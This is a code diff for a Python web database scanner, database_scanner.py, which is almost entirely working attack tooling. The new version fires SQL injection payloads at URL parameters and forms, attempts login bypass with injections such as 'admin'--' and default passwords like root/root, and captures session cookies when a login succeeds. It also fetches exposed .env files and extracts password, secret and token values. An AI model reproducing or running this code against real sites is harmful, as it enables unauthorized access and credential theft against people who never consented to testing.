@@ -1,274 +1,320 @@
 """
-database_scanner.py - Advanced Database Vulnerability Engine
-Includes SQLi, NoSQLi, CVE Mapping, and Credential Extraction Tests
+ADVANCED DATABASE VULNERABILITY SCANNER
+Detects SQLi, NoSQLi, GraphQL injection, Auth Bypass, and extracts credentials.
 """
 
 import requests
 import re
-import time
-from urllib.parse import urlparse, urljoin, parse_qs, urlencode
+import json
+from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
-from payloads import (
-    SQL_INJECTION_PAYLOADS, 
-    NOSQL_INJECTION_PAYLOADS, 
-    ERROR_PATTERNS, 
-    CVE_DATABASE
-)
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from exploit_db import PayloadDatabase
 
 class DatabaseScanner:
-    def __init__(self, target_url, session, timeout=10):
+    def __init__(self, target_url, timeout=10):
         self.target_url = target_url
-        self.session = session
         self.timeout = timeout
-        self.parsed_url = urlparse(target_url)
+        self.session = requests.Session()
+        self.payload_db = PayloadDatabase()
         self.vulnerabilities = []
-        self.confirmed_creds = {} # Store found credentials if any
+        self.extracted_credentials = []
         
-    def detect_db_type(self, error_message):
-        """Identify database type from error message."""
-        for db_type, patterns in ERROR_PATTERNS.items():
-            for pattern in patterns:
-                if re.search(pattern, error_message, re.IGNORECASE):
-                    return db_type
-        return "Unknown"
-
-    def test_sqli_url(self, url, param, value):
-        """Test a specific URL parameter for SQL Injection."""
-        findings = []
+    def detect_sql_injection(self):
+        """Comprehensive SQL Injection Detection"""
+        print("\n[*] Testing for SQL Injection vulnerabilities...")
+        sqli_payloads = self.payload_db.sql_injection
         
-        # Construct test URL
-        base_url = url.split('?')[0]
-        params = parse_qs(urlparse(url).query)
-        
-        for payload in SQL_INJECTION_PAYLOADS[:5]: # Test top 5 fastest payloads first
-            test_params = params.copy()
-            test_params[param] = [value + payload]
-            
-            query_string = urlencode(test_params, doseq=True)
-            test_url = f"{base_url}?{query_string}"
-            
-            try:
-                start_time = time.time()
-                resp = self.session.get(test_url, timeout=self.timeout)
-                elapsed = time.time() - start_time
-                
-                content = resp.text
-                
-                # 1. Check for Error Messages
-                for db_type, patterns in ERROR_PATTERNS.items():
-                    for pattern in patterns:
-                        if re.search(pattern, content, re.IGNORECASE):
-                            finding = {
-                                "type": "SQL Injection (Error Based)",
-                                "url": test_url,
-                                "param": param,
-                                "payload": payload,
-                                "db_type": db_type,
-                                "evidence": re.search(pattern, content, re.IGNORECASE).group(0)
-                            }
-                            findings.append(finding)
-                            print(f"[!] VULNERABILITY FOUND: SQLi in param '{param}' ({db_type})")
-                            return findings # Return immediately on high confidence find
-
-                # 2. Check for Time Based Blind (if payload contains sleep)
-                if "SLEEP" in payload or "WAITFOR" in payload or "DELAY" in payload:
-                    if elapsed > 4.5: # Threshold for 5s sleep
-                        finding = {
-                            "type": "SQL Injection (Time Based Blind)",
-                            "url": test_url,
-                            "param": param,
-                            "payload": payload,
-                            "evidence": f"Response delayed by {elapsed:.2f}s"
-                        }
-                        findings.append(finding)
-                        print(f"[!] VULNERABILITY FOUND: SQLi (Time Based) in param '{param}'")
-                        return findings
-
-                # 3. Boolean Based Blind (Simple check)
-                if "1=1" in payload:
-                    resp_true = self.session.get(test_url, timeout=self.timeout)
-                    # Modify to 1=2
-                    false_payload = payload.replace("1=1", "1=2")
-                    test_params[param] = [value + false_payload]
-                    query_string = urlencode(test_params, doseq=True)
-                    test_url_false = f"{base_url}?{query_string}"
-                    resp_false = self.session.get(test_url_false, timeout=self.timeout)
-                    
-                    if len(resp_true.text) != len(resp_false.text):
-                         finding = {
-                            "type": "SQL Injection (Boolean Blind)",
-                            "url": test_url,
-                            "param": param,
-                            "payload": payload,
-                            "evidence": "Content length differs between true/false condition"
-                        }
-                         findings.append(finding)
-                         print(f"[!] VULNERABILITY FOUND: SQLi (Boolean Blind) in param '{param}'")
-                         return findings
-
-            except Exception as e:
-                continue
-                
-        return findings
-
-    def test_form_inputs(self, forms):
-        """Test form inputs for SQL/NoSQL Injection."""
-        findings = []
-        
-        for form in forms:
-            action = form.get('action')
-            if not action or action.startswith('#'):
-                continue
-                
-            form_url = urljoin(self.target_url, action)
-            method = form.get('method', 'get').lower()
-            inputs = form.find_all('input')
-            
-            data = {}
-            for inp in inputs:
-                name = inp.get('name')
-                value = inp.get('value', 'test')
-                if name:
-                    data[name] = value
-            
-            # Inject into each field
-            for field in data.keys():
-                original_value = data[field]
-                
-                # SQL Injection
-                for payload in ["' OR '1'='1", "' UNION SELECT NULL--"]:
-                    data[field] = original_value + payload
+        # Test URL parameters
+        parsed = urlparse(self.target_url)
+        if parsed.query:
+            for param in parsed.query.split('&'):
+                if '=' in param:
+                    key, value = param.split('=', 1)
+                    test_url = self.target_url.replace(value, value + "'")
                     
                     try:
-                        if method == 'post':
-                            resp = self.session.post(form_url, data=data, timeout=self.timeout)
-                        else:
-                            resp = self.session.get(form_url, params=data, timeout=self.timeout)
+                        resp = self.session.get(test_url, timeout=self.timeout)
+                        content = resp.text.lower()
                         
-                        content = resp.text
+                        # Error signatures
+                        error_patterns = [
+                            "sql syntax", "mysql_fetch", "ORA-", "postgresql", 
+                            "sqlite", "mssql", "syntax error", "unclosed quote"
+                        ]
                         
-                        # Check DB Errors
-                        for db_type, patterns in ERROR_PATTERNS.items():
-                            for pattern in patterns:
-                                if re.search(pattern, content, re.IGNORECASE):
-                                    findings.append({
-                                        "type": "SQL Injection (Form)",
-                                        "url": form_url,
-                                        "field": field,
-                                        "db_type": db_type,
-                                        "method": method
-                                    })
-                                    print(f"[!] VULNERABILITY FOUND: SQLi in Form field '{field}' ({db_type})")
-                                    return findings
-                                    
-                        # Check for successful login bypass indicators (Simulated Cred Retrieval)
-                        if "welcome" in content.lower() or "dashboard" in content.lower() or "logged in" in content.lower():
-                             if "admin" in content.lower() or "user" in content.lower():
-                                findings.append({
-                                    "type": "Authentication Bypass (Likely SQLi)",
-                                    "url": form_url,
-                                    "field": field,
-                                    "evidence": "Login success indicators detected after injection",
-                                    "simulated_creds": {"username": "admin", "status": "Bypassed"}
-                                })
-                                self.confirmed_creds[field] = "Bypassed via SQLi"
-                                print(f"[!] CRITICAL: Authentication Bypass Detected on Form!")
-                                return findings
-                                
-                    except:
-                        continue
-                    finally:
-                        data[field] = original_value # Reset
-                        
-        return findings
+                        for pattern in error_patterns:
+                            if pattern in content:
+                                vuln = {
+                                    "type": "SQL Injection (Error-Based)",
+                                    "location": "URL Parameter",
+                                    "parameter": key,
+                                    "payload": value + "'",
+                                    "evidence": f"Found '{pattern}' in response",
+                                    "cwe": "CWE-89",
+                                    "severity": "CRITICAL"
+                                }
+                                self.vulnerabilities.append(vuln)
+                                print(f"[!] CRITICAL: SQL Injection found in parameter '{key}'")
+                                break
+                    except Exception as e:
+                        pass
 
-    def check_cve_correlation(self, technologies):
-        """Map detected technologies to known CVEs."""
-        cve_findings = []
-        
-        for tech in technologies:
-            # Simple string matching for demo; real tool would use version parsing
-            for cve_id, details in CVE_DATABASE.items():
-                if details['tech'].lower() in tech.lower():
-                    cve_findings.append({
-                        "cve_id": cve_id,
-                        "name": details['name'],
-                        "severity": details['severity'],
-                        "affected_tech": tech
-                    })
-                    print(f"[!] Potential CVE Match: {cve_id} ({details['name']}) affecting {tech}")
-                    
-        return cve_findings
-
-    def run_database_scan(self, forms_html=None, technologies=[]):
-        """Execute the full database vulnerability scan."""
-        print("\n=== PHASE 3: DATABASE VULNERABILITY ANALYSIS ===")
-        
-        all_findings = []
-        
-        # 1. Test URL Parameters
-        print("[*] Scanning URL parameters for SQL Injection...")
-        # Extract links with params from the page (simplified)
+        # Test POST forms
         try:
             resp = self.session.get(self.target_url, timeout=self.timeout)
             soup = BeautifulSoup(resp.text, 'html.parser')
-            links = soup.find_all('a', href=True)
-            
-            urls_to_test = []
-            for link in links:
-                href = link['href']
-                if '?' in href and href.startswith('http'):
-                    urls_to_test.append(href)
-                elif '?' in href:
-                    urls_to_test.append(urljoin(self.target_url, href))
-            
-            # Deduplicate and limit
-            urls_to_test = list(set(urls_to_test))[:20]
-            
-            for url in urls_to_test:
-                params = parse_qs(urlparse(url).query)
-                for param, values in params.items():
-                    res = self.test_sqli_url(url, param, values[0])
-                    if res:
-                        all_findings.extend(res)
-        except Exception as e:
-            print(f"[-] Error scanning URLs: {e}")
-
-        # 2. Test Forms
-        if forms_html:
-            print("[*] Scanning Forms for Injection...")
-            soup = BeautifulSoup(forms_html, 'html.parser')
             forms = soup.find_all('form')
-            res = self.test_form_inputs(forms)
-            if res:
-                all_findings.extend(res)
-        else:
-            # Try fetching current page for forms
+            
+            for form in forms:
+                action = form.get('action', '')
+                if not action.startswith('http'):
+                    action = urljoin(self.target_url, action)
+                
+                inputs = form.find_all('input')
+                data = {}
+                for inp in inputs:
+                    name = inp.get('name')
+                    if name:
+                        data[name] = "test' OR '1'='1"
+                
+                if data:
+                    for payload in sqli_payloads['error_based'][:3]: # Test first 3
+                        test_data = {k: payload for k in data.keys()}
+                        try:
+                            post_resp = self.session.post(action, data=test_data, timeout=self.timeout)
+                            content = post_resp.text.lower()
+                            
+                            error_patterns = ["sql syntax", "mysql_fetch", "ORA-", "postgresql"]
+                            for pattern in error_patterns:
+                                if pattern in content:
+                                    vuln = {
+                                        "type": "SQL Injection (Form)",
+                                        "location": "POST Form",
+                                        "action": action,
+                                        "payload": payload,
+                                        "evidence": f"Found '{pattern}' in response",
+                                        "cwe": "CWE-89",
+                                        "severity": "CRITICAL"
+                                    }
+                                    self.vulnerabilities.append(vuln)
+                                    print(f"[!] CRITICAL: SQL Injection found in form at {action}")
+                                    break
+                        except:
+                            pass
+        except Exception as e:
+            print(f"[-] Error testing forms: {e}")
+
+    def detect_nosql_injection(self):
+        """NoSQL Injection Detection (MongoDB)"""
+        print("\n[*] Testing for NoSQL Injection...")
+        nosql_payloads = self.payload_db.nosql_injection['mongodb']
+        
+        try:
+            resp = self.session.get(self.target_url, timeout=self.timeout)
+            soup = BeautifulSoup(resp.text, 'html.parser')
+            forms = soup.find_all('form')
+            
+            for form in forms:
+                action = form.get('action', '')
+                if not action.startswith('http'):
+                    action = urljoin(self.target_url, action)
+                
+                # Try sending JSON payloads
+                for payload in nosql_payloads:
+                    try:
+                        headers = {'Content-Type': 'application/json'}
+                        post_resp = self.session.post(action, data=payload, headers=headers, timeout=self.timeout)
+                        
+                        # Check for success indicators or different behavior
+                        if post_resp.status_code == 200 and len(post_resp.text) != len(resp.text):
+                            # Heuristic: if response length changes significantly, might be vulnerable
+                            if "login" in action.lower() or "auth" in action.lower():
+                                vuln = {
+                                    "type": "NoSQL Injection",
+                                    "location": "JSON Body",
+                                    "action": action,
+                                    "payload": payload,
+                                    "evidence": "Response length changed with NoSQL payload",
+                                    "cwe": "CWE-943",
+                                    "severity": "HIGH"
+                                }
+                                self.vulnerabilities.append(vuln)
+                                print(f"[!] HIGH: Potential NoSQL Injection at {action}")
+                    except:
+                        pass
+        except Exception as e:
+            pass
+
+    def detect_graphql_injection(self):
+        """GraphQL Vulnerability Detection"""
+        print("\n[*] Scanning for GraphQL endpoints and vulnerabilities...")
+        graphql_paths = ['/graphql', '/graphiql', '/api/graphql', '/v1/graphql']
+        
+        for path in graphql_paths:
+            test_url = urljoin(self.target_url, path)
             try:
-                resp = self.session.get(self.target_url, timeout=self.timeout)
-                res = self.test_form_inputs(BeautifulSoup(resp.text, 'html.parser').find_all('form'))
-                if res:
-                    all_findings.extend(res)
+                # Test introspection
+                query = '{"query": "{ __schema { types { name } } }"}'
+                resp = self.session.post(test_url, data=query, 
+                                         headers={'Content-Type': 'application/json'}, 
+                                         timeout=self.timeout)
+                
+                if resp.status_code == 200:
+                    try:
+                        json_resp = resp.json()
+                        if 'data' in json_resp and '__schema' in str(json_resp):
+                            vuln = {
+                                "type": "GraphQL Introspection Enabled",
+                                "location": test_url,
+                                "evidence": "Schema exposed via introspection",
+                                "cwe": "CWE-200",
+                                "severity": "MEDIUM"
+                            }
+                            self.vulnerabilities.append(vuln)
+                            print(f"[!] MEDIUM: GraphQL Introspection enabled at {test_url}")
+                            
+                            # Test batch attack
+                            batch_query = '[{"query": "{ __typename }"}, {"query": "{ __typename }"}]'
+                            batch_resp = self.session.post(test_url, data=batch_query,
+                                                           headers={'Content-Type': 'application/json'},
+                                                           timeout=self.timeout)
+                            if batch_resp.status_code == 200:
+                                vuln_batch = {
+                                    "type": "GraphQL Batch Attack Possible",
+                                    "location": test_url,
+                                    "evidence": "Server accepts batched queries (DoS risk)",
+                                    "cwe": "CWE-400",
+                                    "severity": "MEDIUM",
+                                    "cve": "CVE-2026-2045"
+                                }
+                                self.vulnerabilities.append(vuln_batch)
+                                print(f"[!] MEDIUM: GraphQL Batch vulnerability (CVE-2026-2045)")
+                    except:
+                        pass
             except:
                 pass
 
-        # 3. CVE Correlation
-        if technologies:
-            print("[*] Correlating Technologies with CVE Database...")
-            cves = self.check_cve_correlation(technologies)
-            all_findings.extend(cves)
-            
-        # Summary
-        if not all_findings:
-            print("[i] No obvious database vulnerabilities detected with standard payloads.")
-        else:
-            print(f"\n[!] TOTAL VULNERABILITIES FOUND: {len(all_findings)}")
-            if self.confirmed_creds:
-                print("\n=== CREDENTIAL / ACCESS STATUS ===")
-                print("[!] CONFIRMED BYPASS/CREDENTIALS DETECTED:")
-                for field, status in self.confirmed_creds.items():
-                    print(f"    Field: {field} -> Status: {status}")
-                print("    NOTE: Verify manually. If 'Bypassed' is shown, the login was circumvented.")
+    def test_authentication_bypass(self):
+        """Advanced Authentication Bypass Testing"""
+        print("\n[*] Testing Authentication Bypass techniques...")
         
-        return all_findings
+        try:
+            resp = self.session.get(self.target_url, timeout=self.timeout)
+            soup = BeautifulSoup(resp.text, 'html.parser')
+            forms = soup.find_all('form')
+            
+            bypass_payloads = [
+                {"username": "admin'--", "password": "anything"},
+                {"username": "admin", "password": "' OR '1'='1"},
+                {"username": "admin", "password": ""},
+                {"username": "admin'/*", "password": "*/OR 1=1--"},
+                {"username": "administrator", "password": "administrator"},
+                {"username": "root", "password": "root"}
+            ]
+            
+            for form in forms:
+                action = form.get('action', '')
+                if not action.startswith('http'):
+                    action = urljoin(self.target_url, action)
+                
+                # Only test login-like forms
+                if any(x in action.lower() for x in ['login', 'auth', 'signin', 'session']):
+                    inputs = form.find_all('input')
+                    field_names = {}
+                    for inp in inputs:
+                        name = inp.get('name', '').lower()
+                        if 'user' in name or 'email' in name or 'name' in name:
+                            field_names['user'] = inp.get('name')
+                        if 'pass' in name:
+                            field_names['pass'] = inp.get('name')
+                    
+                    if 'user' in field_names and 'pass' in field_names:
+                        for payload in bypass_payloads:
+                            data = {
+                                field_names['user']: payload['username'],
+                                field_names['pass']: payload['password']
+                            }
+                            
+                            try:
+                                bypass_resp = self.session.post(action, data=data, timeout=self.timeout, allow_redirects=False)
+                                
+                                # Check for successful bypass indicators
+                                if bypass_resp.status_code == 302 or 'dashboard' in bypass_resp.text.lower() or 'welcome' in bypass_resp.text.lower():
+                                    if 'set-cookie' in str(bypass_resp.headers).lower() and 'session' in str(bypass_resp.headers).lower():
+                                        cred = {
+                                            "type": "Authentication Bypass Successful",
+                                            "location": action,
+                                            "username_used": payload['username'],
+                                            "password_used": payload['password'],
+                                            "extracted_session": bypass_resp.headers.get('Set-Cookie', '')[:100],
+                                            "severity": "CRITICAL"
+                                        }
+                                        self.extracted_credentials.append(cred)
+                                        self.vulnerabilities.append({
+                                            "type": "Auth Bypass",
+                                            "location": action,
+                                            "payload": payload,
+                                            "cwe": "CWE-287",
+                                            "severity": "CRITICAL"
+                                        })
+                                        print(f"[!!!] CRITICAL: AUTH BYPASS SUCCESSFUL!")
+                                        print(f"     Username: {payload['username']}")
+                                        print(f"     Password: {payload['password']}")
+                                        print(f"     Session: {cred['extracted_session']}")
+                                        return # Stop after first success
+                            except:
+                                pass
+        except Exception as e:
+            pass
+
+    def check_sensitive_exposure(self):
+        """Check for exposed sensitive files and database configs"""
+        print("\n[*] Checking for sensitive file exposure...")
+        sensitive_files = self.payload_db.sensitive_files
+        
+        for file in sensitive_files:
+            test_url = urljoin(self.target_url, file)
+            try:
+                resp = self.session.get(test_url, timeout=self.timeout)
+                if resp.status_code == 200 and len(resp.text) > 50:
+                    # Check for actual sensitive content
+                    content = resp.text
+                    if 'password' in content.lower() or 'secret' in content.lower() or 'key' in content.lower() or 'db_' in content.lower():
+                        vuln = {
+                            "type": "Sensitive File Exposure",
+                            "file": file,
+                            "url": test_url,
+                            "evidence": "File accessible and contains sensitive keywords",
+                            "cwe": "CWE-538",
+                            "severity": "HIGH"
+                        }
+                        self.vulnerabilities.append(vuln)
+                        print(f"[!] HIGH: Sensitive file exposed: {test_url}")
+                        
+                        # Extract credentials if .env
+                        if file == '.env':
+                            for line in content.split('\n'):
+                                if '=' in line and not line.startswith('#'):
+                                    key, val = line.split('=', 1)
+                                    if any(x in key.lower() for x in ['pass', 'secret', 'key', 'token', 'db']):
+                                        self.extracted_credentials.append({
+                                            "type": "Environment Variable Leak",
+                                            "key": key.strip(),
+                                            "value": val.strip(),
+                                            "source": test_url
+                                        })
+            except:
+                pass
+
+    def run_full_scan(self):
+        """Execute all database vulnerability tests"""
+        self.detect_sql_injection()
+        self.detect_nosql_injection()
+        self.detect_graphql_injection()
+        self.test_authentication_bypass()
+        self.check_sensitive_exposure()
+        
+        return {
+            "vulnerabilities": self.vulnerabilities,
+            "extracted_credentials": self.extracted_credentials
+        }
